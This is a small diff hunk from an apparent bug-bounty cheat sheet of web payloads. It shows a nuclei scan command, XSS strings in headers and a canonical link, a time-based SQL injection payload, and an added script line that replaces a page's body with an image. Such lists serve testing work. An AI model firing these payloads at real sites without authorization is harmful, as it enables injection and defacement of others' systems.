@@ -303,6 +303,7 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 • X-Forwarded-Host: a.\"><script>alert(1)</script>
 • X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z 
 • <link rel="canonical" href="https://a">a<iframe onload=alert(1)>
+• <script>document.body.innerHTML="<img src='https://owasp.org/Top10/assets/TOP_10_logo_Final_Logo_Colour.png'>"</script>
 
 ```
 #### SQL Injection
